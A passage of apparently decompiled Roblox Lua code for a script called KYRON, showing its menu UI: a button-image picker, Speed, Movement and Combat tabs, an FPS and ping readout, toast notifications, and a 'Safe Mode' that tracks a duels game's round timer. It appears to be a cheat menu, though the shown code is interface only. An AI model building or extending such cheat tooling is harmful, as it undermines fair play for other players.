          textButton2.Size = UDim2.new(0, 22, 0, 34)
          textButton2.Position = arg and UDim2.new(0, 10, 0.5, -17) or UDim2.new(1, -25, 0.5, -17)
          textButton2.ZIndex = 8
          fn56(textButton2, 24)
          return textButton2
        end

        local function fn73(arg)
          local n36 = math.max(0, scrollingFrame.AbsoluteCanvasSize.X - scrollingFrame.AbsoluteWindowSize.X)
          local n37 = math.clamp(scrollingFrame.CanvasPosition.X + arg * (n35 + 8) * 3, 0, n36)
          TweenService:Create(scrollingFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { CanvasPosition = Vector2.new(n37, 0) }):Play()
        end

        createTextButton3("<", true).Activated:Connect(function()
          fn73(-1)
        end)

        createTextButton3(">", false).Activated:Connect(function()
          fn73(1)
        end)

        local tbl47 = {
          "DEFAULT",
          "rbxassetid://90631990302263",
          "rbxassetid://111941119745474",
          "rbxassetid://88369503310562",
          "rbxassetid://80708025126373",
          "rbxassetid://102253425322931",
          "rbxassetid://138739435956313",
          "rbxassetid://135181794444219",
        }

        n34 = tonumber(_G._KYRONBtnImgIdx) or 1

        if n34 < 1 or n34 > #tbl47 then
          n34 = 1
        end

        local n36 = 3
        local v93 = 10

        fn70 = function(arg)
          local v94 = tbl47[arg]
          if not _G._KYRONBtnImages then
            return
          end

          if v94 == "DEFAULT" then
            for _, KYRONBtnImage in ipairs(_G._KYRONBtnImages) do
              KYRONBtnImage.bg:SetAttribute("_KYRONNoButtonImage", true)
              KYRONBtnImage.bg.Image = ""
              KYRONBtnImage.bg.ImageRectSize = Vector2.zero
              KYRONBtnImage.bg.ImageRectOffset = Vector2.zero
              KYRONBtnImage.bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
              KYRONBtnImage.bg.BackgroundTransparency = 0
              local buttonNoneGradient = KYRONBtnImage.bg:FindFirstChild("ButtonNoneGradient")

              if buttonNoneGradient then
                buttonNoneGradient:Destroy()
              end

              local instance6 = Instance.new("UIGradient")
              instance6.Name = "ButtonNoneGradient"
              local new = ColorSequenceKeypoint.new
              local color2 = Color3.fromRGB
              local v95 = 2
              local v96 = 10
              instance6.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(2, 2, 3)),
                new(1, color2(v95, 2, v96)),
              })
              instance6.Rotation = 25
              instance6.Parent = KYRONBtnImage.bg
              KYRONBtnImage.glow.Image = ""
              KYRONBtnImage.glow.ImageRectSize = Vector2.zero
              KYRONBtnImage.glow.ImageRectOffset = Vector2.zero
              KYRONBtnImage.glow.BackgroundTransparency = 1

              if KYRONBtnImage.refresh then
                KYRONBtnImage.refresh()
              end
            end

            if _G._KYRONApplyImageTheme then
              _G._KYRONApplyImageTheme()
            end

            return
          end

          local n37 = n36 * 128 / v93 * 96
          local n38, n39

          if 1 > n37 then
            n38 = 1024 * n37
            n39 = 1024
          else
            n39 = 1024 / n37
            n38 = 1024
          end

          local n40 = (1024 - n38) / 2
          local n41 = (1024 - n39) / 2
          local n42 = n38 / n36
          local n43 = n39 / v93

          for _, KYRONBtnImage in ipairs(_G._KYRONBtnImages) do
            if KYRONBtnImage.button then
              KYRONBtnImage.button.ClipsDescendants = true
            end

            if KYRONBtnImage.bg then
              KYRONBtnImage.bg.ClipsDescendants = true
            end

            if KYRONBtnImage.glow then
              KYRONBtnImage.glow.ClipsDescendants = true
            end

            KYRONBtnImage.bg:SetAttribute("_KYRONNoButtonImage", false)
            local buttonNoneGradient = KYRONBtnImage.bg:FindFirstChild("ButtonNoneGradient")

            if buttonNoneGradient then
              buttonNoneGradient:Destroy()
            end

            KYRONBtnImage.bg.BackgroundTransparency = 1
            local span = _G._KYRONCircleButtons and not KYRONBtnImage.isWide and 1 or KYRONBtnImage.span or 1
            local vector2 = Vector2.new(n40 + KYRONBtnImage.col * n42, n41 + KYRONBtnImage.rowIndex * n43)
            local vector22 = Vector2.new(n42 * span, n43)
            KYRONBtnImage.bg.Image = v94
            KYRONBtnImage.bg.ImageRectSize = vector22
            KYRONBtnImage.bg.ImageRectOffset = vector2
            KYRONBtnImage.glow.Image = v94
            KYRONBtnImage.glow.ImageRectSize = vector22
            KYRONBtnImage.glow.ImageRectOffset = vector2

            if KYRONBtnImage.refresh then
              KYRONBtnImage.refresh()
            end
          end

          if _G._KYRONApplyImageTheme then
            _G._KYRONApplyImageTheme()
          end
        end

        _G._KYRONRefreshButtonImages = function()
          pcall(fn70, n34)
        end

        local buttonsImage = createTextLabel(Settings, "Buttons Image")
        buttonsImage.Visible = false
        local frame5 = Instance.new("Frame")
        frame5.Name = "ButtonsImagePicker"
        frame5.BackgroundColor3 = tbl37.row
        frame5.BackgroundTransparency = 0.3
        frame5.BorderSizePixel = 0
        frame5.Size = UDim2.new(1, -4, 0, 52)
        frame5.ZIndex = 3
        frame5.Parent = Settings
        frame5.Visible = false
        fn56(frame5, 11)
        fn57(frame5, 1.25)

        local function KYRONApplyButtonImagePickerVisib()
          local visible = false
          buttonsImage.Visible = visible
          frame5.Visible = visible
        end

        _G._KYRONApplyButtonImagePickerVisibility = KYRONApplyButtonImagePickerVisib
        KYRONApplyButtonImagePickerVisib()

        -- Button image picker is disabled in KYRON; skip bulk asset preloading at startup.

        local n37 = 42
        local scrollingFrame2 = Instance.new("ScrollingFrame")
        scrollingFrame2.Name = "BtnImgScroll"
        scrollingFrame2.BackgroundTransparency = 1
        scrollingFrame2.BorderSizePixel = 0
        scrollingFrame2.Size = UDim2.new(1, -56, 1, 0)
        scrollingFrame2.Position = UDim2.new(0, 28, 0, 0)
        scrollingFrame2.ScrollingDirection = Enum.ScrollingDirection.X
        scrollingFrame2.ScrollBarThickness = 0
        scrollingFrame2.AutomaticCanvasSize = Enum.AutomaticSize.X
        scrollingFrame2.CanvasSize = UDim2.new()
        scrollingFrame2.Active = true
        scrollingFrame2.ScrollingEnabled = true
        scrollingFrame2.ClipsDescendants = true
        scrollingFrame2.ZIndex = 4
        scrollingFrame2.Parent = frame5
        fn72(scrollingFrame2)
        local uiListLayout2 = Instance.new("UIListLayout")
        uiListLayout2.FillDirection = Enum.FillDirection.Horizontal
        uiListLayout2.Padding = UDim.new(0, 8)
        uiListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
        uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
        uiListLayout2.Parent = scrollingFrame2
        local uiPadding2 = Instance.new("UIPadding")
        uiPadding2.PaddingLeft = UDim.new(0, 2)
        uiPadding2.Parent = scrollingFrame2
        local tbl48 = {}

        for i, v94 in ipairs(tbl47) do
          local imageButton2 = Instance.new("ImageButton")
          imageButton2.Name = "BtnImgThumb" .. i
          imageButton2.LayoutOrder = i
          imageButton2.BackgroundColor3 = v94 == "DEFAULT" and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(14, 14, 18)
          imageButton2.BackgroundTransparency = v94 == "DEFAULT" and 0 or 0.25
          imageButton2.BorderSizePixel = 0
          imageButton2.Image = v94 == "DEFAULT" and "" or v94
          imageButton2.ImageColor3 = Color3.fromRGB(255, 255, 240)
          imageButton2.ImageTransparency = v94 == "DEFAULT" and 1 or 0.22
          imageButton2.ScaleType = Enum.ScaleType.Crop
          imageButton2.Size = UDim2.new(0, 42, 0, 34)
          imageButton2.AutoButtonColor = false
          imageButton2.ZIndex = 5
          imageButton2.Parent = scrollingFrame2
          Instance.new("UICorner", imageButton2).CornerRadius = UDim.new(0, 9)
          local uiStroke = Instance.new("UIStroke", imageButton2)
          uiStroke.Color = Color3.fromRGB(80, 80, 90)
          uiStroke.Thickness = 1
          uiStroke.Transparency = 0.48

          if v94 == "DEFAULT" then
            local uiGradient = Instance.new("UIGradient")
            uiGradient.Name = "NoneGradient"
            local colorSequence = ColorSequence.new
            local tbl49 = {}
            local v95 = ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 22, 30))
            local v96 = ColorSequenceKeypoint.new(0.18, Color3.fromRGB(2, 2, 3))
            local v97 = ColorSequenceKeypoint.new(0.82, Color3.fromRGB(2, 2, 3))
            local new = ColorSequenceKeypoint.new
            local color2 = Color3.fromRGB
            local v98 = 22
            tbl49[1] = v95
            tbl49[2] = v96
            tbl49[3] = v97

            do
              local values = table.pack(new(1, color2(v98, 22, 25)))
              table.move(values, 1, values.n, 4, tbl49)
            end

            uiGradient.Color = colorSequence(tbl49)
            uiGradient.Rotation = 25
            uiGradient.Parent = imageButton2
            local textLabel = Instance.new("TextLabel")
            textLabel.Name = "NoneLabel"
            textLabel.BackgroundTransparency = 1
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.Text = "NONE"
            textLabel.TextColor3 = Color3.fromRGB(240, 255, 240)
            textLabel.Font = Enum.Font.GothamMedium
            textLabel.TextSize = 6
            textLabel.ZIndex = 6
            textLabel.Parent = imageButton2
          else
            local textLabel = Instance.new("TextLabel")
            textLabel.BackgroundTransparency = 1
            textLabel.Size = UDim2.new(1, 0, 0, 12)
            textLabel.Position = UDim2.new(0, 0, 1, -13)
            textLabel.Text = tostring(i - 1)
            textLabel.TextColor3 = Color3.fromRGB(255, 240, 240)
            textLabel.Font = Enum.Font.GothamBlack
            textLabel.TextSize = 9
            textLabel.TextStrokeTransparency = 0.2
            textLabel.ZIndex = 7
            textLabel.Parent = imageButton2
          end

          tbl48[i] = { btn = imageButton2, stroke = uiStroke }
        end

        local function fn74()
          for i, v94 in ipairs(tbl48) do
            local flag29 = i == n34
            local flag30 = _G._KYRONInvertUI == true
            local v95 = TweenService
            local create = v95.Create
            local stroke = v94.stroke
            local tweenInfo = TweenInfo.new(0.15)
            local tbl49 = {}
            local color2

            if flag30 then
              color2 = flag29 and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(82, 82, 88)
            else
              color2 = flag30
            end

            color2 = color2 or flag29 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(80, 80, 90)
            tbl49.Color = color2
            tbl49.Transparency = flag29 and 0.1 or 0.4
            tbl49.Thickness = flag29 and 2 or 1
            create(v95, stroke, tweenInfo, tbl49):Play()

            TweenService:Create(v94.btn, TweenInfo.new(0.15), {
              BackgroundTransparency = i == 1 and 0 or flag29 and 0.05 or 0.25,
              ImageTransparency = i == 1 and 1 or flag29 and 0 or 0.22,
            }):Play()
          end
        end

        for i, v94 in ipairs(tbl48) do
          v94.btn.Activated:Connect(function()
            n34 = i
            _G._KYRONBtnImgIdx = i
            pcall(fn70, i)
            fn74()

            if autoSaveSettings.auto then
              task.spawn(function()
                pcall(saveKYRONSettings)
              end)
            end
          end)
        end

        fn74()

        task.defer(function()
          pcall(fn70, n34)
        end)

        local function createTextButton4(text, arg)
          local textButton2 = Instance.new("TextButton", frame5)
          textButton2.Name = arg and "BtnImgArrowLeft" or "BtnImgArrowRight"
          textButton2.Text = text
          textButton2.Font = Enum.Font.GothamMedium
          textButton2.TextSize = 18
          textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
          textButton2.BackgroundColor3 = Color3.fromRGB(18, 18, 23)
          textButton2.BackgroundTransparency = 0.05
          textButton2.BorderSizePixel = 0
          textButton2.Size = UDim2.new(0, 22, 0, 34)
          textButton2.Position = arg and UDim2.new(0, 3, 0.5, -17) or UDim2.new(1, -25, 0.5, -17)
          textButton2.ZIndex = 8
          fn56(textButton2, 8)
          return textButton2
        end

        local function fn75(arg)
          local n38 = math.max(0, scrollingFrame2.AbsoluteCanvasSize.X - scrollingFrame2.AbsoluteWindowSize.X)
          local n39 = math.clamp(scrollingFrame2.CanvasPosition.X + arg * (n37 + 24) * 3, 0, n38)
          TweenService:Create(scrollingFrame2, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { CanvasPosition = Vector2.new(n39, 0) }):Play()
        end

        createTextButton4("<", true).Activated:Connect(function()
          fn75(-1)
        end)

        createTextButton4(">", false).Activated:Connect(function()
          fn75(1)
        end)

        local textLabel = moveButtons:FindFirstChildOfClass("TextLabel")

        createTextButton2(moveButtons, function()
          KYRONMobileBtnLocked = not KYRONMobileBtnLocked
          _G._KYRONMobileBtnLocked = KYRONMobileBtnLocked

          if textLabel then
            textLabel.Text = KYRONMobileBtnLocked and "Move Buttons" or "Lock Buttons"
          end

          if autoSaveSettings.auto then
            task.spawn(function()
              pcall(saveKYRONSettings)
            end)
          end
        end)

        createTextButton2(resetButtons, function()
          fn65()
          _G._KYRONMobileBtnPos = {}
          _G._KYRONMobileBtnPositions = _G._KYRONMobileBtnPositions or {}
          _G._KYRONMobileBtnPositions[KYRONMobilePositionProfile] = _G._KYRONMobileBtnPos

          if autoSaveSettings.auto then
            task.spawn(function()
              pcall(saveKYRONSettings)
            end)
          end

          local textLabel2 = resetButtons:FindFirstChildOfClass("TextLabel")

          if textLabel2 then
            local text = textLabel2.Text
            textLabel2.Text = "RESET ✓"

            task.delay(1.2, function()
              pcall(function()
                textLabel2.Text = text
              end)
            end)
          end
        end)

        local function fn76(arg)
          for k, v94 in pairs(tbl39) do
            v94.Visible = k == arg
          end

          for _, v94 in ipairs(tbl41) do
            if v94.page == tbl39[arg] then
              v94.tween:Play()
            else
              v94.tween:Pause()
            end
          end

          for k, v94 in pairs(tbl40) do
            local flag29 = k == arg
            local color2 = tbl37.accent.R > 0.98 and tbl37.accent.G > 0.98 and tbl37.accent.B > 0.98 and Color3.fromRGB(0, 0, 0) or tbl37.accent
            v94.BackgroundColor3 = flag29 and tbl37.accent or Color3.fromRGB(22, 22, 27)
            TweenService:Create(v94, TweenInfo.new(0.2), { BackgroundTransparency = flag29 and 0.04 or 0.08 }):Play()
            v94.TextColor3 = flag29 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(215, 215, 222)
            local borderGradient = v94:FindFirstChild("BorderGradient", true)

            if borderGradient then
              borderGradient.Color = _G._KYRONInvertUI and v80 or flag29 and v78 or v79
              local KYRONInvertUI = _G._KYRONInvertUI and v81
              local v95

              if KYRONInvertUI then
                v95 = KYRONInvertUI
              else
                v95 = flag29 and v82 or v83
              end

              borderGradient.Transparency = v95
            end
          end
        end

        local tbl49 = {
          Speed = "SPEED",
          Movement = "MOVEMENT",
          Combat = "COMBAT",
          Utility = "VISUAL",
          Settings = "SETTINGS",
          Keybinds = "KEYBINDS",
          Controller = "CONTROL",
        }

        for i, v94 in ipairs({ "Speed", "Movement", "Combat", "Utility", "Settings", "Keybinds", "Controller" }) do
          local textButton2 = Instance.new("TextButton")
          textButton2.Name = v94
          textButton2.LayoutOrder = i
          textButton2.BackgroundColor3 = Color3.fromRGB(22, 22, 27)
          textButton2.BackgroundTransparency = 0.08
          textButton2.Text = string.upper(tbl49[v94] or v94)
          textButton2.AutoLocalize = false
          textButton2.TextColor3 = tbl37.muted
          textButton2.TextSize = 13
          textButton2.TextScaled = false
          textButton2.Font = Enum.Font.GothamBold
          textButton2.Size = UDim2.new(1, -12, 0, 48)
          textButton2.AutoButtonColor = false
          textButton2.ZIndex = 4
          textButton2.Parent = instance5
          fn56(textButton2, 9)
          local categoryStroke = Instance.new("UIStroke")
          categoryStroke.Color = Color3.fromRGB(75, 75, 84)
          categoryStroke.Thickness = 1
          categoryStroke.Transparency = 0.55
          categoryStroke.Parent = textButton2
          local v95, v96 = fn57(textButton2, 1.2)
          v96.Name = "BorderGradient"

          textButton2.Activated:Connect(function()
            fn76(v94)
          end)

          tbl40[v94] = textButton2
        end

        fn76("Speed")
        local v94 = false

        local function KYRONSetOpen(arg, arg2)
          v94 = arg

          if v94 then
            if frame3 then
              frame3.Visible = false
            end

            frame2.Visible = true

            if _G._KYRONRegisterMainUiInteraction then
              _G._KYRONRegisterMainUiInteraction()
            end

            local v95 = position
            frame2.Size = UDim2.new(0, 460, 0, 560)
            frame2.BackgroundTransparency = _G._KYRONInvertUI and 0.1 or 0.03

            if arg2 then
              frame2.Position = v95
            else
              frame2.Position = UDim2.new(v95.X.Scale, -460, v95.Y.Scale, v95.Y.Offset)
              TweenService:Create(frame2, TweenInfo.new(0.32, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Position = v95 }):Play()
            end
          else
            position = frame2.Position
            local tween = TweenService:Create(frame2, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
              Position = UDim2.new(position.X.Scale, -460, position.Y.Scale, position.Y.Offset),
            })
            tween:Play()

            tween.Completed:Connect(function()
              if not v94 then
                frame2.Visible = false
              end
            end)

            if frame3 then
              frame3.Visible = true

              task.spawn(function()
                task.wait(0.1)
                local currentCamera = workspace.CurrentCamera

                if currentCamera then
                  local viewportSize = currentCamera.ViewportSize
                  local x = frame3.AbsolutePosition.X
                  local y = frame3.AbsolutePosition.Y

                  if x < 0 or y < 0 or x > viewportSize.X - 50 or y > viewportSize.Y - 50 then
                    frame3.Position = UDim2.new(0, 14, 0.4, 0)
                    _G._KYRONFloatBtnPos = nil
                  end
                end
              end)
            end
          end
        end

        _G._KYRONSetOpen = KYRONSetOpen

        instance.Activated:Connect(function()
          KYRONSetOpen(not v94)
        end)

        textButton.Activated:Connect(function()
          KYRONSetOpen(false)
        end)

        local n38 = 0
        local n39 = 0

        RunService.RenderStepped:Connect(function(deltaTime)
          n38 += 1
          n39 += deltaTime

          if 0.5 <= n39 then
            local n40 = math.floor(n38 / n39 + 0.5)
            v85.Text = "FPS: " .. tostring(n40)
            n38 = 0
            n39 = 0

            local ok, result = pcall(function()
              return Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
            end)

            v84.Text = "PING: " .. (ok and result or "--")
          end
        end)

        fn61()


        _G._KYRONSafeModeEnsureNotifier = function()
          if _G._KYRONSafeModeNotifyGui and _G._KYRONSafeModeNotifyGui.Parent then
            return
          end
          local KYRONSafeModeNotifications = playerGui:FindFirstChild("KYRONSafeModeNotifications")

          if KYRONSafeModeNotifications then
            KYRONSafeModeNotifications:Destroy()
          end

          if _G._KYRONSafeModeViewportConn then
            pcall(function()
              _G._KYRONSafeModeViewportConn:Disconnect()
            end)
          end

          local screenGui2 = Instance.new("ScreenGui")
          screenGui2.Name = "KYRONSafeModeNotifications"
          screenGui2.ResetOnSpawn = false
          screenGui2.IgnoreGuiInset = false
          -- Keep below Roblox topbar input so leave/chat stay clickable.
          screenGui2.DisplayOrder = 20
          screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
          pcall(function()
            screenGui2.ClipToDeviceSafeArea = true
          end)
          screenGui2.Parent = playerGui
          local frame6 = Instance.new("Frame")
          frame6.Name = "ToastHolder"
          frame6.AnchorPoint = Vector2.new(1, KYRONSafeModeEnabled and 0 or 1)
          frame6.BackgroundTransparency = 1
          frame6.Active = false
          frame6.Selectable = false
          frame6.Position = UDim2.new(1, -16, 1, -12)
          frame6.AutomaticSize = Enum.AutomaticSize.XY
          frame6.Parent = screenGui2
          local uiListLayout3 = Instance.new("UIListLayout")
          uiListLayout3.FillDirection = Enum.FillDirection.Vertical
          uiListLayout3.HorizontalAlignment = Enum.HorizontalAlignment.Right
          uiListLayout3.VerticalAlignment = KYRONSafeModeEnabled and Enum.VerticalAlignment.Top or Enum.VerticalAlignment.Bottom
          uiListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
          uiListLayout3.Padding = UDim.new(0, KYRONSafeModeEnabled and 6 or 8)
          uiListLayout3.Parent = frame6
          _G._KYRONSafeModeNotifyGui = screenGui2
          _G._KYRONSafeModeNotifyHolder = frame6
          _G._KYRONSafeModeToastSerial = 0

          _G._KYRONSafeModeResizeNotifier = function()
            if not frame6.Parent then
              return
            end
            local currentCamera = workspace.CurrentCamera
            currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)
            local KYRONSafeModeToastWidth

            if KYRONSafeModeEnabled then
              KYRONSafeModeToastWidth = math.clamp(math.floor(currentCamera.X * 0.34), 126, 165)
            else
              KYRONSafeModeToastWidth = math.clamp(math.floor(currentCamera.X * 0.23), 250, 330)
            end

            _G._KYRONSafeModeToastWidth = KYRONSafeModeToastWidth
            _G._KYRONSafeModeToastHeight = KYRONSafeModeEnabled and 28 or 60
            frame6.Size = UDim2.fromOffset(KYRONSafeModeToastWidth, math.min(math.floor(currentCamera.Y * 0.34), KYRONSafeModeEnabled and 150 or 250))
            frame6.Position = KYRONSafeModeEnabled and UDim2.new(1, -8, 0, 8) or UDim2.new(1, -16, 1, -16)
          end

          _G._KYRONSafeModeResizeNotifier()
          local currentCamera = workspace.CurrentCamera

          if currentCamera then
            _G._KYRONSafeModeViewportConn = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(_G._KYRONSafeModeResizeNotifier)
          end
        end

        _G._KYRONSafeModeNotify = function(arg)
          pcall(_G._KYRONSafeModeEnsureNotifier)
          local KYRONSafeModeNotifyHolder = _G._KYRONSafeModeNotifyHolder
          if not KYRONSafeModeNotifyHolder or not KYRONSafeModeNotifyHolder.Parent then
            return
          end
          _G._KYRONSafeModeToastSerial = (_G._KYRONSafeModeToastSerial or 0) + 1
          local KYRONSafeModeToastSerial = _G._KYRONSafeModeToastSerial
          local KYRONSafeModeToastHeight = _G._KYRONSafeModeToastHeight or KYRONSafeModeEnabled and 28 or 50
          local KYRONSafeModeToastWidth = _G._KYRONSafeModeToastWidth
          local n40

          if KYRONSafeModeToastWidth then
            n40 = KYRONSafeModeToastWidth
          else
            n40 = KYRONSafeModeEnabled and 165 or 300
          end

          local tbl50 = {}

          for _, child in ipairs(KYRONSafeModeNotifyHolder:GetChildren()) do
            if child:IsA("Frame") and child.Name:sub(1, 6) == "Toast_" then
              tbl50[#tbl50 + 1] = child
            end
          end

          table.sort(tbl50, function(arg2, arg3)
            return arg2.LayoutOrder < arg3.LayoutOrder
          end)

          while #tbl50 >= 4 do
            tbl50[1]:Destroy()
            table.remove(tbl50, 1)
          end

          local frame6 = Instance.new("Frame")
          frame6.Name = "Toast_" .. KYRONSafeModeToastSerial
          frame6.LayoutOrder = KYRONSafeModeToastSerial
          frame6.BackgroundTransparency = 1
          frame6.Size = UDim2.new(1, 0, 0, KYRONSafeModeToastHeight)
          frame6.Parent = KYRONSafeModeNotifyHolder
          local frame7 = Instance.new("Frame")
          frame7.Name = "Card"
          local flag29 = _G._KYRONBackgroundColorMatch == true
          frame7.BackgroundColor3 = KYRONBgIdx == 0 and (flag29 and tbl37.accent or Color3.fromRGB(10, 3, 4)) or Color3.fromRGB(3, 10, 4)
          frame7.BackgroundTransparency = 1
          frame7.BorderSizePixel = 0
          frame7.Position = UDim2.fromOffset(n40 + 24, 0)
          frame7.Size = UDim2.new(1, 0, 1, 0)
          frame7.ZIndex = 2
          frame7.ClipsDescendants = true
          frame7.Parent = frame6
          local udim = UDim.new(0, KYRONSafeModeEnabled and 9 or 14)
          Instance.new("UICorner", frame7).CornerRadius = udim
          local imageLabel = Instance.new("ImageLabel")
          imageLabel.Name = "CurrentBackground"
          imageLabel.BackgroundTransparency = 1
          imageLabel.BorderSizePixel = 0
          imageLabel.Size = UDim2.new(1, 0, 1, 0)
          imageLabel.Image = KYRONBgIdx == 0 and "" or tbl44[KYRONBgIdx] or ""
          imageLabel.ImageColor3 = flag29 and tbl37.accent or Color3.fromRGB(255, 255, 255)
          imageLabel.ImageTransparency = 0
          imageLabel.ScaleType = Enum.ScaleType.Crop
          imageLabel.ZIndex = 2
          imageLabel.Parent = frame7
          Instance.new("UICorner", imageLabel).CornerRadius = udim
          local instance6 = Instance.new("Frame")
          instance6.Name = "ReadabilityShade"
          instance6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
          instance6.BackgroundTransparency = 1
          instance6.BorderSizePixel = 0
          instance6.Size = UDim2.new(1, 0, 1, 0)
          instance6.ZIndex = 3
          instance6.Parent = frame7
          Instance.new("UICorner", instance6).CornerRadius = udim
          local textLabel2 = Instance.new("TextLabel")
          textLabel2.Name = "Message"
          textLabel2.BackgroundTransparency = 1
          textLabel2.Position = UDim2.new(0, 16, 0, 0)
          textLabel2.Size = UDim2.new(1, -24, 1, 0)
          textLabel2.Font = Enum.Font.GothamBlack
          textLabel2.Text = tostring(arg or "SAFE MODE")
          textLabel2.TextColor3 = Color3.fromRGB(240, 255, 255)
          textLabel2.TextSize = KYRONSafeModeEnabled and 8 or 16
          textLabel2.TextTransparency = 1
          textLabel2.TextWrapped = true
          textLabel2.TextXAlignment = Enum.TextXAlignment.Left
          textLabel2.TextYAlignment = Enum.TextYAlignment.Center
          textLabel2.ZIndex = 4
          textLabel2.Parent = frame7
          TweenService:Create(frame7, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Position = UDim2.fromOffset(0, 0), BackgroundTransparency = 0.18 }):Play()
          TweenService:Create(textLabel2, TweenInfo.new(0.2), { TextTransparency = 0 }):Play()

          task.delay(2.35, function()
            if not frame6.Parent then
              return
            end
            TweenService:Create(frame7, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Position = UDim2.fromOffset(n40 + 24, 0), BackgroundTransparency = 1 }):Play()
            local tbl51 = { ImageTransparency = 1 }
            TweenService:Create(imageLabel, TweenInfo.new(0.14), tbl51):Play()
            TweenService:Create(instance6, TweenInfo.new(0.14), { BackgroundTransparency = 1 }):Play()
            TweenService:Create(textLabel2, TweenInfo.new(0.14), { TextTransparency = 1 }):Play()

            task.delay(0.2, function()
              if frame6.Parent then
                frame6:Destroy()
              end
            end)
          end)
        end

        _G._KYRONSafeModeCountdownActive = function()
          local KYRONSafeModeState = _G._KYRONSafeModeState

          local function fn79()
            if KYRONSafeModeState then
              KYRONSafeModeState.timerLastNumber = nil

              if KYRONSafeModeState.timerPhase == "round" or KYRONSafeModeState.timerRoundSeen then
                KYRONSafeModeState.timerInactiveSince = KYRONSafeModeState.timerInactiveSince or os.clock()
                local timerInactiveSince = KYRONSafeModeState.timerInactiveSince

                if os.clock() - timerInactiveSince >= 0.75 then
                  KYRONSafeModeState.timerPhase = "inactive"
                  KYRONSafeModeState.timerStartUsed = false
                  KYRONSafeModeState.timerRoundSeen = false
                  KYRONSafeModeState.timerSawInactive = true
                end
              elseif KYRONSafeModeState.timerPhase == "unknown" then
                KYRONSafeModeState.timerPhase = "inactive"
                KYRONSafeModeState.timerSawInactive = true
              end
            end

            return false
          end

          local duelsMachineTopFrame = playerGui:FindFirstChild("DuelsMachineTopFrame", true)
          duelsMachineTopFrame = duelsMachineTopFrame and duelsMachineTopFrame:FindFirstChild("Timer", true)
          duelsMachineTopFrame = duelsMachineTopFrame and duelsMachineTopFrame:FindFirstChild("Label", true)
          if not duelsMachineTopFrame or not duelsMachineTopFrame:IsA("TextLabel") then
            return (fn79())
          end
          local parent = duelsMachineTopFrame

          while parent and parent ~= playerGui do
            if parent:IsA("GuiObject") and parent.Visible == false then
              return (fn79())
            end

            if parent:IsA("ScreenGui") and parent.Enabled == false then
              return (fn79())
            end
            parent = parent.Parent
          end

          local str10 = tostring(duelsMachineTopFrame.Text or ""):upper():gsub("<.->", ""):gsub("%s+", "")

          if KYRONSafeModeState then
            KYRONSafeModeState.timerInactiveSince = nil
          end

          if str10 == "READY" or str10 == "STARTING" or str10 == "GETREADY" then
            if KYRONSafeModeState then
              if KYRONSafeModeState.timerPhase ~= "starting" then
                KYRONSafeModeState.timerStartUsed = false
              end

              KYRONSafeModeState.timerPhase = "starting"
              KYRONSafeModeState.timerLastNumber = nil
              KYRONSafeModeState.timerSawInactive = false
              KYRONSafeModeState.timerStartUsed = true
            end

            return true
          end

          if str10 == "GO" or str10 == "FIGHT" then
            if KYRONSafeModeState then
              KYRONSafeModeState.timerPhase = "round"
              KYRONSafeModeState.timerRoundSeen = true
              KYRONSafeModeState.timerStartUsed = true
              KYRONSafeModeState.timerLastNumber = nil
            end

            return false
          end

          local match, v95 = str10:match("^(%d+):(%d+)$")

          if match and v95 then
            local timerLastNumber = tonumber(match) * 60 + tonumber(v95)

            if KYRONSafeModeState then
              if timerLastNumber <= 0 and KYRONSafeModeState.timerRoundSeen then
                KYRONSafeModeState.timerPhase = "inactive"
                KYRONSafeModeState.timerStartUsed = false
                KYRONSafeModeState.timerRoundSeen = false
                KYRONSafeModeState.timerSawInactive = true
              else
                KYRONSafeModeState.timerPhase = "round"
                KYRONSafeModeState.timerRoundSeen = true
                KYRONSafeModeState.timerStartUsed = true
                KYRONSafeModeState.timerSawInactive = false
              end

              KYRONSafeModeState.timerLastNumber = timerLastNumber
            end

            return false
          end

          local timerLastNumber = tonumber(str10)
          if not timerLastNumber then
            return false
          end

          if timerLastNumber > 10 then
            if KYRONSafeModeState then
              KYRONSafeModeState.timerPhase = "round"
              KYRONSafeModeState.timerRoundSeen = true
              KYRONSafeModeState.timerStartUsed = true
              KYRONSafeModeState.timerLastNumber = timerLastNumber
              KYRONSafeModeState.timerSawInactive = false
            end

            return false
          end

          if timerLastNumber <= 0 then
            if KYRONSafeModeState then
              KYRONSafeModeState.timerLastNumber = timerLastNumber

              if KYRONSafeModeState.timerPhase == "round" or KYRONSafeModeState.timerRoundSeen then
                KYRONSafeModeState.timerPhase = "inactive"
                KYRONSafeModeState.timerStartUsed = false
                KYRONSafeModeState.timerRoundSeen = false
                KYRONSafeModeState.timerSawInactive = true
              end
            end

            return false
          end

          local timerRoundSeen

          if KYRONSafeModeState then
            timerRoundSeen = KYRONSafeModeState.timerRoundSeen or KYRONSafeModeState.timerStartUsed
          else
            timerRoundSeen = KYRONSafeModeState
          end

          if timerRoundSeen and KYRONSafeModeState.timerPhase ~= "starting" then
            KYRONSafeModeState.timerLastNumber = timerLastNumber
            return false
          end

          if KYRONSafeModeState and KYRONSafeModeState.timerPhase == "starting" then
            KYRONSafeModeState.timerLastNumber = timerLastNumber
            return true
          end

          if KYRONSafeModeState and KYRONSafeModeState.timerStartUsed ~= true and KYRONSafeModeState.timerSawInactive then
            KYRONSafeModeState.timerPhase = "starting"
